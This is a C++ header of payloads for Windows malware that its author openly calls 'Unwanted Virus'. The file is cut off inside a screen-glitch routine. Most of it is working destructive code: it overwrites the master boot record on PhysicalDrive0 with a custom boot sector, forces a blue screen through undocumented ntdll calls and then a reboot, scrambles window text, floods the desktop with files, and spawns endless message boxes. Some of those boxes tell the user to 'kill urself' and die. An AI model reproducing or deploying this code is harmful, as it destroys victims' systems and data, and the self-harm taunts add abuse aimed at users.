#pragma once
/*-------------------------------------------+
|                                            |
|   Unwanted Virus Source Code               |
|   payload data "payload.h"                 |
|                                            |
|   (C) BenjaminFretez 2021.                 |
|                                            |
+--------------------------------------------*/


/* include files */
#include <windows.h> // Required for WINAPI
#include <iostream> // Required for input-output
#include <fstream> // Required for files
#include <stdio.h>
#include <shlwapi.h> // Required for check file existence
#include <cstdlib> // Required for no "ambiguous"
#include <stdlib.h> // Same
#include <data.h> // For Data


#pragma warning (disable: 4244) // For fucking Argument Warning for an unusable payload
#pragma warning (disable: 4566) // For fucking Universal-Character-Name I know it cannot be represented in current code page.

/* required for downloading files */
#pragma comment (lib, "urlmon.lib")
#include <wininet.h>
#pragma comment(lib,"Wininet.lib")


using namespace std;

#include <shlobj.h>
#include <exdisp.h>
#include <shlwapi.h>
#include <atlbase.h>
#include <atlalloc.h>
#include <stdio.h>

class CCoInitialize {
public:
    CCoInitialize() : m_hr(CoInitialize(NULL)) { }
    ~CCoInitialize() { if (SUCCEEDED(m_hr)) CoUninitialize(); }
    operator HRESULT() const { return m_hr; }
    HRESULT m_hr;
};

void FindDesktopFolderView(REFIID riid, void** ppv)
{
    CComPtr<IShellWindows> spShellWindows;
    spShellWindows.CoCreateInstance(CLSID_ShellWindows);

    CComVariant vtLoc(CSIDL_DESKTOP);
    CComVariant vtEmpty;
    long lhwnd;
    CComPtr<IDispatch> spdisp;
    spShellWindows->FindWindowSW(
        &vtLoc, &vtEmpty,
        SWC_DESKTOP, &lhwnd, SWFO_NEEDDISPATCH, &spdisp);

    CComPtr<IShellBrowser> spBrowser;
    CComQIPtr<IServiceProvider>(spdisp)->
        QueryService(SID_STopLevelBrowser,
            IID_PPV_ARGS(&spBrowser));

    CComPtr<IShellView> spView;
    spBrowser->QueryActiveShellView(&spView);

    spView->QueryInterface(riid, ppv);
}

int genrand(int a, int b)
{
    srand(time(NULL));

    int r = rand() % 2;

    if (r == 0)
        return a;
    else
        return b;
}

void MoveDesktopIcons() {
    // The Main Function
    CCoInitialize init;
    CComPtr<IFolderView> spView;
    FindDesktopFolderView(IID_PPV_ARGS(&spView));

    CComPtr<IEnumIDList> spEnum;
    spView->Items(SVGIO_ALLVIEW, IID_PPV_ARGS(&spEnum));
    for (CComHeapPtr<ITEMID_CHILD> spidl;
        spEnum->Next(1, &spidl, nullptr) == S_OK;
        spidl.Free()) {
        POINT pt;
        spView->GetItemPosition(spidl, &pt);
        if (genrand(0, 1) == 1) {
            pt.x += (rand() % 10) + 5;
            pt.y += (rand() % 10) + 5;
        }
        if (genrand(0, 1) == 0) {
            pt.x -= (rand() % 10) + 5;
            pt.y -= (rand() % 10) + 5;
        }

        PCITEMID_CHILD apidl[1] = { spidl };
        spView->SelectAndPositionItems(
            1, apidl, &pt, SVSI_POSITIONITEM);
    }
}


/* for message boxes on random position */
LRESULT CALLBACK msgBoxHook(int nCode, WPARAM wParam, LPARAM lParam) {

    scrw = GetSystemMetrics(SM_CXSCREEN);
    scrh = GetSystemMetrics(SM_CYSCREEN);
    if (nCode == HCBT_CREATEWND) {
        CREATESTRUCT* pcs = ((CBT_CREATEWND*)lParam)->lpcs;

        if ((pcs->style & WS_DLGFRAME) || (pcs->style & WS_POPUP)) {
            HWND hwnd = (HWND)wParam;

            int x = random() % (scrw - pcs->cx);
            int y = random() % (scrh - pcs->cy);

            pcs->x = x;
            pcs->y = y;
        }
    }

    return CallNextHookEx(0, nCode, wParam, lParam);
}

/* overwrite mbr content */
const unsigned char mbrContent[] = { 0xB8, 0x13, 0x00, 0xCD, 0x10, 0xFC, 0xB8, 0x00, 0xA0, 0x8E, 0xD8, 0x8E, 0xC0, 0xB4, 0x04, 0xA3,
0x90, 0xFC, 0x31, 0xC0, 0xB9, 0x48, 0x7E, 0x31, 0xFF, 0xF3, 0xAB, 0x8B, 0x05, 0x40, 0x40, 0xAB,
0x88, 0xC4, 0x92, 0xB8, 0x00, 0x1C, 0xAB, 0xB8, 0x98, 0xE6, 0xAB, 0xB8, 0x28, 0x14, 0xBB, 0x10,
0x25, 0xB1, 0x0B, 0xAB, 0x83, 0xC0, 0x16, 0x93, 0xAB, 0xFE, 0xC4, 0x93, 0xE2, 0xF5, 0x05, 0x8E,
0x15, 0x80, 0xFF, 0x5C, 0x75, 0xEB, 0xBF, 0xA0, 0xD4, 0xB1, 0x05, 0xB8, 0x04, 0x0B, 0xE8, 0x85,
0x01, 0x83, 0xC7, 0x3C, 0xE2, 0xF5, 0xBE, 0x96, 0xFC, 0x80, 0x7C, 0x02, 0x20, 0x72, 0x2D, 0xFE,
0xC5, 0x80, 0xFD, 0x37, 0x74, 0xAC, 0xAD, 0x97, 0xAD, 0x3C, 0x28, 0x74, 0x0B, 0x3C, 0x20, 0x75,
0x04, 0xC6, 0x44, 0xFE, 0x28, 0xE8, 0x5E, 0x01, 0x81, 0xFE, 0x72, 0xFD, 0x75, 0xDB, 0x88, 0xF0,
0x2C, 0x02, 0x72, 0xD2, 0x34, 0x01, 0x88, 0xC2, 0x88, 0xC6, 0xEB, 0xCA, 0x80, 0x74, 0x02, 0x08,
0x45, 0x83, 0xE5, 0x07, 0x52, 0x56, 0x55, 0x75, 0x0E, 0xB4, 0x00, 0xCD, 0x1A, 0x3B, 0x16, 0x8C,
0xFC, 0x74, 0xF6, 0x89, 0x16, 0x8C, 0xFC, 0xBE, 0x80, 0xFC, 0xB9, 0x04, 0x00, 0xAD, 0x3D, 0x40,
0x01, 0x97, 0x72, 0x43, 0xE8, 0x17, 0x01, 0x81, 0xEF, 0x42, 0x01, 0x8A, 0x05, 0x2C, 0x20, 0x72,
0x29, 0x56, 0x57, 0xB4, 0x04, 0xF6, 0xE4, 0x01, 0xC6, 0xAD, 0x97, 0xC6, 0x04, 0x20, 0xB8, 0x08,
0x0E, 0xE8, 0x02, 0x01, 0x5F, 0x5E, 0xEB, 0x1F, 0xAD, 0x09, 0xC0, 0x74, 0x2D, 0x3D, 0x00, 0xF0,
0x97, 0x73, 0x14, 0xE8, 0xE8, 0x00, 0x81, 0xC7, 0x3E, 0x01, 0xB8, 0x0C, 0x0C, 0x89, 0x7C, 0xFE,
0x80, 0xBD, 0x40, 0x01, 0x0B, 0x75, 0x05, 0x31, 0xC0, 0x89, 0x44, 0xFE, 0x80, 0x3D, 0x1C, 0x75,
0x06, 0xC7, 0x06, 0x92, 0xFC, 0x38, 0x0A, 0xE8, 0xC6, 0x00, 0xE2, 0xCC, 0xBE, 0x92, 0xFC, 0xAD,
0x08, 0xC0, 0x74, 0x0C, 0x04, 0x08, 0x75, 0x08, 0xB4, 0x1C, 0xFE, 0x0E, 0x91, 0xFC, 0x78, 0x4A,
0x89, 0x44, 0xFE, 0x8B, 0x3C, 0xE8, 0xAE, 0x00, 0x75, 0x2E, 0xB4, 0x02, 0xCD, 0x16, 0xA8, 0x04,
0x74, 0x02, 0x4F, 0x4F, 0xA8, 0x08, 0x74, 0x02, 0x47, 0x47, 0xA8, 0x03, 0x74, 0x0D, 0x83, 0x3E,
0x80, 0xFC, 0x00, 0x75, 0x06, 0x8D, 0x45, 0x08, 0xA3, 0x80, 0xFC, 0x97, 0x3D, 0xFE, 0xE5, 0x74,
0x07, 0x3D, 0x32, 0xE7, 0x74, 0x02, 0x89, 0x04, 0x5D, 0x5E, 0x5A, 0x8B, 0x04, 0x80, 0xFA, 0x01,
0x76, 0x0A, 0x05, 0x80, 0x02, 0x3D, 0x80, 0xD4, 0x72, 0x1B, 0xCD, 0x20, 0x48, 0x48, 0x72, 0x03,
0x83, 0xC0, 0x04, 0x50, 0xD1, 0xE8, 0xB1, 0xA0, 0xF6, 0xF1, 0xFE, 0xCC, 0x80, 0xFC, 0x94, 0x58,
0x72, 0x03, 0x80, 0xCE, 0x16, 0x89, 0x04, 0x05, 0x06, 0x0F, 0x93, 0xB9, 0x03, 0x00, 0xE4, 0x40,
0x3C, 0xFC, 0x72, 0x0D, 0xBF, 0x82, 0xFC, 0x83, 0x3D, 0x00, 0x74, 0x03, 0xAF, 0xE2, 0xF8, 0x89,
0x1D, 0xE9, 0xC2, 0xFE, 0x18, 0x18, 0x3C, 0x24, 0x3C, 0x7E, 0xFF, 0x24, 0x00, 0x80, 0x42, 0x18,
0x10, 0x48, 0x82, 0x01, 0x00, 0xBD, 0xDB, 0x7E, 0x24, 0x3C, 0x66, 0xC3, 0x00, 0x3C, 0x5A, 0xFF,
0xA5, 0x3C, 0x66, 0x66, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x72, 0x02, 0x31, 0xC0,
0x89, 0x85, 0x40, 0x01, 0xAB, 0xC3, 0x51, 0x57, 0x9C, 0x50, 0xBB, 0xA4, 0x7D, 0x2E, 0xD7, 0x93,
0xB9, 0x0A, 0x00, 0xF8, 0x88, 0xF8, 0x88, 0xFC, 0xE8, 0xE1, 0xFF, 0xD0, 0xE3, 0xE2, 0xF5, 0x81,
0xC7, 0x6C, 0x02, 0x58, 0x40, 0xA8, 0x07, 0x75, 0xE0, 0x9D, 0x5F, 0x59, 0xC3, 0x4F, 0x55, 0xAA
};

/* payload thread */
DWORD WINAPI payloadThread(LPVOID parameter) {
    int delay = 0;
    int times = 0;
    int runtime = 0;

    int(*function)(int, int) = (int(*)(int, int))parameter;

    for (;;) {
        if (delay-- == 0) {
            delay = (*function)(times++, runtime);
        }

        runtime++;
        Sleep(10);
    }
}


/* kill Windows instant */
void killWindowsInstant() {

    // Try to force BSOD first
    HMODULE ntdll = LoadLibraryA("ntdll");
    FARPROC RtlAdjustPrivilege = GetProcAddress(ntdll, "RtlAdjustPrivilege");
    FARPROC NtRaiseHardError = GetProcAddress(ntdll, "NtRaiseHardError");

    if (RtlAdjustPrivilege != NULL && NtRaiseHardError != NULL) {
        BOOLEAN tmp1; DWORD tmp2;
        ((void(*)(DWORD, DWORD, BOOLEAN, LPBYTE))RtlAdjustPrivilege)(19, 1, 0, &tmp1);
        ((void(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))NtRaiseHardError)(0xc000029A, 0, 0, 0, 6, &tmp2);
    }

    // If the computer is still running, do it the normal way
    HANDLE token;
    TOKEN_PRIVILEGES privileges;

    OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token);

    LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &privileges.Privileges[0].Luid);
    privileges.PrivilegeCount = 1;
    privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    AdjustTokenPrivileges(token, FALSE, &privileges, 0, (PTOKEN_PRIVILEGES)NULL, 0);

    ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_HARDWARE | SHTDN_REASON_MINOR_DISK);
}

/* reverse text payload */
void strReverseW(LPWSTR str);

void enumerateChildren(HWND hwnd) {
    LPWSTR str = (LPWSTR)GlobalAlloc(GMEM_ZEROINIT, sizeof(WCHAR) * rand());

    SendMessageW(hwnd, WM_GETTEXT, 8192, (LPARAM)str);
    strReverseW(str);
    SendMessageW(hwnd, WM_SETTEXT, NULL, (LPARAM)str);

    GlobalFree(str);

    HWND child = GetWindow(hwnd, GW_CHILD);

    while (child) {
        enumerateChildren(child);
        child = GetWindow(child, GW_HWNDNEXT);
    }
}

BOOL CALLBACK EnumWindowProc(HWND hwnd, LPARAM lParam) {
    enumerateChildren(hwnd);

    return TRUE;
}


void strReverseW(LPWSTR str) {
    int len = lstrlenW(str);

    WCHAR c;
    int i, j;
    for (i = 0, j = len - 1; i < j; i++, j--) {
        c = str[i];
        str[i] = str[j];
        str[j] = c;
    }

    // Fix Newlines
    for (i = 0; i < len - 1; i++) {
        if (str[i] == L'\n' && str[i + 1] == L'\r') {
            str[i] = L'\r';
            str[i + 1] = L'\n';
        }
    }
}

int payloadReverseText(int times, int runtime) {
    EnumWindows(&EnumWindowProc, NULL);

    return 50;
}

/* reverse change payload */
void strchangeW(LPWSTR str);

void enumerateChildren2(HWND hwnd) {
    LPWSTR str = (LPWSTR)GlobalAlloc(GMEM_ZEROINIT, sizeof(WCHAR) * rand());

    SendMessageW(hwnd, WM_GETTEXT, 8192, (LPARAM)str);
    strchangeW(str);
    SendMessageW(hwnd, WM_SETTEXT, NULL, (LPARAM)str);

    GlobalFree(str);

    HWND child = GetWindow(hwnd, GW_CHILD);

    while (child) {
        enumerateChildren(child);
        child = GetWindow(child, GW_HWNDNEXT);
    }
}

void strchangeW(LPWSTR str) {
    int len = lstrlenW(str);

    WCHAR c;
    int i, j;
    for (i = 0, j = len - 1; i < j; i++, j--) {
        c = str[i] - rand() % 10;
        str[i] = str[j] + rand() % 10;
        str[j] = c + rand() % 10;
    }

    // Fix Newlines
    for (i = 0; i < len - 1; i++) {
        if (str[i] == L'\n' && str[i + 1] == L'\r') {
            str[i] = L'\r';
            str[i + 1] = L'\n';
        }
    }
}

BOOL CALLBACK EnumWindowProc2(HWND hwnd, LPARAM lParam) {
    enumerateChildren2(hwnd);

    return TRUE;
}

int ChangeText(int times, int runtime) {
    EnumWindows(&EnumWindowProc2, NULL);
    return 50;
}

int payloadChangeText(int times, int runtime) {
    while (1) {
        CreateThread(NULL, NULL, &payloadThread, &ChangeText, NULL, NULL);
        Sleep(1000);
    }
}


/* create desktop files */
void CreateDesktopFiles() {
    TCHAR szPath[MAX_PATH];

    if (SUCCEEDED(SHGetFolderPath(NULL,
        CSIDL_DESKTOP | CSIDL_FLAG_CREATE,
        NULL,
        0,
        szPath)))
    {
        for (int i = 0; i < 500; ++i) {
            SHGetFolderPath(NULL, CSIDL_DESKTOP | CSIDL_FLAG_CREATE, NULL, 0, szPath);
            PathAppend(szPath, L"a" + rand() % 3000);
            CreateFileW(szPath, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
        }
    }
    /* old way, impossible to get it */
    for (int i = 0; i < 150; ++i) {
        break;
        CreateFileW((L"C:\\Users\\Public\\Desktop\\\u0666\u0666" + rand() % (3000)), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
        CreateFileW((L"C:\\Users\\Public\\Desktop\\\u0066\u0066" + rand() % (3000)), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
        CreateFileW((L"C:\\Users\\Public\\Desktop\\\u0006\u0006" + rand() % (3000)), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    }
}

void CreateDesktopFiles_() {
    for (int i = 0; i < 150; ++i) {
        CreateFileA("C:\\Users\\Public\\Desktop\\4t34jgj3t348g34g3" + rand() - rand() / 1000, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
        CreateFileA("C:\\Users\\Public\\Desktop\\sALDpsdiePOSWDjwd" + rand() - rand() / 1000, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
        CreateFileA("C:\\Users\\Public\\Desktop\\E3T34IT4FEIEWJj" + rand() - rand() / 1000, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
        CreateFileA("C:\\Users\\Public\\Desktop\\mi49dkemdefff4g3" + rand() - rand() / 1000, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
        CreateFileA("C:\\Users\\Public\\Desktop\\wefh4¤þ³€€³434g3" + rand() - rand() / 1000, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
        CreateFileA("C:\\Users\\Public\\Desktop\\weffgergerg34g3" + rand() - rand() / 1000, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
        CreateFileA("C:\\Users\\Public\\Desktop\\wefwejfwiegjg34g3" + rand() - rand() / 1000, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
        CreateFileA("C:\\Users\\Public\\Desktop\\wedberjbierberg34g3" + rand() - rand() / 1000, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
        CreateFileA("C:\\Users\\Public\\Desktop\\we2®³²®¤fwfwf4g3" + rand() - rand() / 1000, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
        CreateFileA("C:\\Users\\Public\\Desktop\\wefh4gewr924tusmqg3" + rand() - rand() / 1000, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    }
}

/* destroy MBR by overwrite it */
void DestroyMBR() {

    DWORD dwBytesWritten;

    HANDLE MasterBootRecord = CreateFile(TEXT("\\\\.\\PhysicalDrive0"), GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);

    WriteFile(MasterBootRecord, mbrContent, 512, &dwBytesWritten, NULL);

    CloseHandle(MasterBootRecord);

    cout << "\nMBR Has been destroyed\n";
}

/* first message box thread */
DWORD WINAPI messageBoxThread(LPVOID parameter) {
    while (1) {
        MessageBoxW(NULL, L"AHHHHHHHHH WTF IS HAPPENING???", L"HELPPPPPP!!!!", MB_OK | MB_ICONWARNING);
        Sleep(3000);
        MessageBoxW(NULL, L"ur crazy, u ran unwanted virus", L"kill urself", MB_OK | MB_ICONWARNING);
        Sleep(3000);
        MessageBoxW(NULL, L"u need to die", L"ahahahahaah", MB_OK | MB_ICONQUESTION);
        Sleep(1500);
        MessageBoxW(NULL, L"(╯°□°)╯︵ ┻━┻ ", L"i will kill everyone", MB_OK | MB_ICONINFORMATION);
        Sleep(1500);
        MessageBoxW(NULL, L"lol haha xd", L"lol", MB_OK | MB_ICONERROR);
        Sleep(2000);
        MessageBoxW(NULL, L"Interactive sign-in process initialization has failed.\n\nPlease check the event log for details.", L"Sign-in process initialization failure", MB_OK | MB_ICONERROR);
        Sleep(1500);
        MessageBoxW(NULL, L"Call your technical support hehe", L"\n", MB_OK | MB_ICONERROR);
        Sleep(1500);
        MessageBoxW(NULL, L"don't press ok", L"ur crazy!!!!", MB_OK | MB_ICONINFORMATION);
        Sleep(1500);
        MessageBoxW(NULL, L"><(((*>", L"система", MB_OK | MB_ICONWARNING);
        Sleep(1500);
        CreateThread(NULL, 4096, &messageBoxThread, NULL, NULL, NULL);
        MessageBoxW(NULL, L"Ready to reinstall Windows?", L"®³€³¤³¤³€üþí¤íéé²é", MB_OK | MB_ICONWARNING);
        Sleep(1500);
        MessageBoxW(NULL, L"What the hell I have done?", L"WAAAAAAAAAAAAAH", MB_OK | MB_ICONWARNING);
        Sleep(1500);
        MessageBoxW(NULL, L"³€ó²€‘ð²³‘²‘‘þ²þ", L"®³®²³¤þ³®dcededed", MB_OK | MB_ICONWARNING);
        Sleep(1500);
        MessageBoxW(NULL, L"You got the feeling, I know you are there", L"I am alone ;-;", MB_OK | MB_ICONWARNING);
        Sleep(1500);
    }
    return 0;
}

/* 2nd message box thread */
DWORD WINAPI messageBox1Thread(LPVOID parameter) {
    HHOOK hook = SetWindowsHookEx(WH_CBT, msgBoxHook, 0, GetCurrentThreadId());
    while (1) {
        MessageBoxW(NULL, L"did you run it? why?", L"The Narrator", MB_OK | MB_ICONWARNING);
        Sleep(1500);
        MessageBoxW(NULL, L"Still using this computer?\nlol, I am not MEMZ to ask you", L"lol - мемз пузз", MB_OK | MB_ICONWARNING);
        Sleep(1500);
        MessageBoxW(NULL, L"Stop clicking Ok", L"The Narrator", MB_OK | MB_ICONQUESTION);
        Sleep(1500);
        CreateThread(NULL, 4096, &messageBoxThread, NULL, NULL, NULL);
        MessageBoxW(NULL, L"uR crazy bro u cannot run the unwanted virus", L"0_o", MB_OK | MB_ICONERROR);
        Sleep(1500);
        MessageBoxW(NULL, L"Did you knöw that this malΣ╕are is des©ribing everything is happening tδ you bro?", L"(1) New mes░age from GLaDΣ╕§: 6/6/5╕666 3:∞▒░òá Σ╕", MB_OK | MB_ICONINFORMATION);
        Sleep(1500);
        MessageBoxW(NULL, L"No te parece eso curioso?", L"blue sky up/dw thn sun", MB_OK | MB_ICONQUESTION);
        Sleep(1500);
        MessageBoxW(NULL, L"null is Null or Inexistent", L"True or false?", MB_OK | MB_ICONINFORMATION);
        Sleep(1500);
        MessageBoxW(NULL, L"The application was unable to start correctly (0xc000029A) Click OK to close the application", L"unwanted.exe - Application Error", MB_OK | MB_ICONERROR);
        CreateThread(NULL, 4096, &messageBoxThread, NULL, NULL, NULL);
        CreateThread(NULL, 4096, &messageBox1Thread, NULL, NULL, NULL);
        MessageBoxW(NULL, L"Ready to reinstall Windows?", L"®³€³¤³¤³€üþí¤íéé²é", MB_OK | MB_ICONWARNING);
        Sleep(1500);
        MessageBoxW(NULL, L"my pc is doing strange things plzz helppp", L"®abcdefg®dcededed", MB_OK | MB_ICONWARNING);
        Sleep(1500);
        MessageBoxW(NULL, L"You got the feeling, I know you are there", L"I am alone ;-;", MB_OK | MB_ICONWARNING);
        Sleep(1500);
        CreateThread(NULL, 4096, &messageBoxThread, NULL, NULL, NULL);
        CreateThread(NULL, 4096, &messageBox1Thread, NULL, NULL, NULL);
        MessageBoxW(NULL, L"WHADUEF4HEUFWHFGUERHG4UTYH834T239Y13", L"(1) New mes░age from £Ω▒░ φòá : 6/6/5╕666 3:∞▒░òá Σ╕", MB_OK | MB_ICONINFORMATION);
        Sleep(1500);
    }
}

/* 3rd message box thread */
DWORD WINAPI messageBox2Thread(LPVOID parameter) {
    HHOOK hook = SetWindowsHookEx(WH_CBT, msgBoxHook, 0, GetCurrentThreadId());
    while (1) {
        MessageBoxW(NULL, L"anananananana", L"aaemnanandn", MB_OK | MB_ICONINFORMATION);
        Sleep(3000);
        MessageBoxW(NULL, L"lookk colorful bkgrn", L"ahahahahaah", MB_OK | MB_ICONERROR);
        CreateThread(NULL, 4096, &messageBoxThread, NULL, NULL, NULL);
        Sleep(1500);
        MessageBoxW(NULL, L"die die die", L"i will kill everyone", MB_OK | MB_ICONERROR);
        Sleep(1500);
        CreateThread(NULL, 4096, &messageBox1Thread, NULL, NULL, NULL);
        MessageBoxW(NULL, L"aaaaaa\n  aaaaa", L"i will kill you first", MB_OK | MB_ICONINFORMATION);
        Sleep(2000);
        MessageBoxW(NULL, L"The sign-in process couldn't display security and sign-in\noptions when Ctrl+Alt+Delete was pressed. If Windows\ndoesn't respond, press Esc, or use the power switch to\nrestart.", L"Failure to display security and shut down options", MB_OK | MB_ICONERROR);
        Sleep(1500);
        CreateThread(NULL, 4096, &messageBoxThread, NULL, NULL, NULL);
        MessageBoxW(NULL, L"game shift to shut\n alt & ctrl to move", L"space invaders", MB_OK | MB_ICONINFORMATION);
        Sleep(1500);
        CreateThread(NULL, 4096, &messageBoxThread, NULL, NULL, NULL);
        CreateThread(NULL, 4096, &messageBox1Thread, NULL, NULL, NULL);
        CreateThread(NULL, 4096, &messageBox2Thread, NULL, NULL, NULL);
    }
    return 0;
}

/* 4rd message box thread */
DWORD WINAPI urnidiotmsgbx(LPVOID parameter) {
    HHOOK hook = SetWindowsHookEx(WH_CBT, msgBoxHook, 0, GetCurrentThreadId());
    while (1) {
        MessageBoxW(NULL, L"You are an idiot!", L"You are an idiot!", MB_OK | MB_ICONWARNING);
        CreateThread(NULL, 4096, &messageBox2Thread, NULL, NULL, NULL);
        MessageBoxW(NULL, L"\n", L"\n", MB_OK | MB_ICONERROR);
        Sleep(100);
        CreateThread(NULL, 4096, &urnidiotmsgbx, NULL, NULL, NULL);
        MessageBoxW(NULL, L"Ready to reinstall Windows?", L"®³€³¤³¤³€üþí¤íéé²é", MB_OK | MB_ICONWARNING);
        Sleep(1500);
        MessageBoxW(NULL, L"Oh no! Two Minutes! AHHHHHHHHH", L"helpz zplzzzzz", MB_OK | MB_ICONWARNING);
        Sleep(1500);
        MessageBoxW(NULL, L"Did you knöw that this malΣ╕are is des©ribing everything is happening tδ you bro?", L"(1) New mes░age from GLaDΣ╕§: 6/6/5╕666 3:∞▒░òá Σ╕", MB_OK | MB_ICONINFORMATION);
        Sleep(1500);
        MessageBoxW(NULL, L"No te parece eso curioso?", L"blue sky up/dw thn sun", MB_OK | MB_ICONQUESTION);
        Sleep(1500);
        MessageBoxW(NULL, L"please don't scream me at night :(", L"(1) New mes░age from ùáΣ╕Çτ : 6/6/5╕666 3:∞▒░òá Σ╕", MB_OK | MB_ICONINFORMATION);
        Sleep(1500);
        CreateThread(NULL, 4096, &urnidiotmsgbx, NULL, NULL, NULL);
        MessageBoxW(NULL, L"my pc is doing strange things plzz helppp", L"®abcdefg®dcededed", MB_OK | MB_ICONWARNING);
        Sleep(1500);
        MessageBoxW(NULL, L"You got the feeling, I know you are there", L"I am alone ;-;", MB_OK | MB_ICONWARNING);
        Sleep(1500);
        CreateThread(NULL, 4096, &urnidiotmsgbx, NULL, NULL, NULL);
    }
    return 0;
}

/* 5st message box thread */
DWORD WINAPI othermsgbx(LPVOID parameter) {
    HHOOK hook = SetWindowsHookEx(WH_CBT, msgBoxHook, 0, GetCurrentThreadId());
    while (1) {
        MessageBoxW(NULL, L" α╢öα╢╢α╢º α╢╕α╖Öα╢║ α╢ëα╖Çα╢¡α╖è α╢Üα╖à α╢▒α╖£α╖äα╖Éα╢Ü" + rand() % 10, L" µ░╕µùáΣ╕Çτöƒ ", MB_OK | MB_ICONQUESTION);
        MessageBoxW(NULL, L" ∞¥┤Ω▓â∞¥ä ∞á£Ω▒░ φòá ∞êÿ ∞ùå∞è╡δïêδïñ. " + rand(), L"\n", MB_OK | MB_ICONERROR);
        Sleep(1500);
        MessageBoxW(NULL, L" ╘┤╒╕╓é╓ä ╒╣╒Ñ╓ä ╒»╒í╓Ç╒╕╒▓ ╒╜╒í ╒░╒í╒╢╒Ñ╒¼ " + rand(), L" ∞¥┤Ω▓á ∞êÿ ∞ù ", MB_OK | MB_ICONERROR);
        Sleep(1500);
        MessageBoxW(NULL, L" ∞δïêδ¥┤£Ω▒░ φòá ∞è╡ïñ. " + rand() % 10, L"╘┤╒╕╓é╜╒í ╒░╒í╒╢╒Ñ╒¼ deδïêδded" + rand() % 5, MB_OK | MB_ICONINFORMATION);
        Sleep(1500);
        MessageBoxW(NULL, L" ùáΣ╕Çτµ░ùáΣ╕Çτ╕ùáΣ╕ÇτµöƒùáΣ╕Çτ " + rand(), L" ░ φò▓â∞êÿ ∞ùå∞á ∞è╡δïê∞¥┤Ω¥ä ∞á£Ω▒δïñ. ", MB_OK | MB_ICONINFORMATION);
        Sleep(1500);
        CreateThread(NULL, 4096, &othermsgbx, NULL, NULL, NULL);
    }
    return 0;
}

/* message box payload */
int payloadMessageBox(int times, int runtime) {
    CreateThread(NULL, 4096, &messageBoxThread, NULL, NULL, NULL);
    Sleep(3000);
    CreateThread(NULL, 4096, &messageBox1Thread, NULL, NULL, NULL);
    Sleep(3000);
    CreateThread(NULL, 4096, &messageBox2Thread, NULL, NULL, NULL);
    Sleep(5500);
    CreateThread(NULL, 4096, &urnidiotmsgbx, NULL, NULL, NULL);
    Sleep(2000);
    CreateThread(NULL, 4096, &othermsgbx, NULL, NULL, NULL);
    return 0;
}

/* message boxes when windows die */
DWORD WINAPI ripmessages(LPVOID parameter) {
    HHOOK hook = SetWindowsHookEx(WH_CBT, msgBoxHook, 0, GetCurrentThreadId());
    MessageBoxW(NULL, L"Now I will terminate your system", L"AAAAAAAA", MB_OK | MB_ICONWARNING);
    MessageBoxW(NULL, L"Stop Pressing OK!", L"AAAAAAAA", MB_OK | MB_ICONWARNING);
    return 1;
}

DWORD WINAPI STARTripmessages(LPVOID parameter) {
    while (1) {
        CreateThread(NULL, 4096, &ripmessages, NULL, NULL, NULL);
        Sleep(100);
    }
}


int DestroyURScreen() {


    while (TRUE)
    {
        int y = rand() % sh, h = sh - rand() % sh - (sh / 1 - 1);
        HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
        SelectObject(hdc, brush);
        BitBlt(hdc, 0, y, sw, h, hdc, rand() % 1 - 1, y, SRCCOPY); // Mini effect blur to left bbbbbb
        PatBlt(hdc, -1, y, sw, h, PATINVERT);
        Sleep(rand() % 10);
        BitBlt(hdc, rand() % (sw - 0), rand() % (sh - 0), rand() % (sw - 0), rand() % (sh - 0), hdc, rand() % (sw - 0), rand() % (sh - 0), DSTINVERT); // Pick random parts of screen and Invert it
        BitBlt(hdc, rand() % (sw - 0), rand() % (sh - 0), rand() % (sw - 0), rand() % (sh - 0), hdc, rand() % (sw - 0), rand() % (sh - 0), SRCCOPY); // Pick random parts of screen and copy it
        hwnd = GetForegroundWindow();
        hW = GetWindowDC(hwnd);
        hdc = GetDC(0);
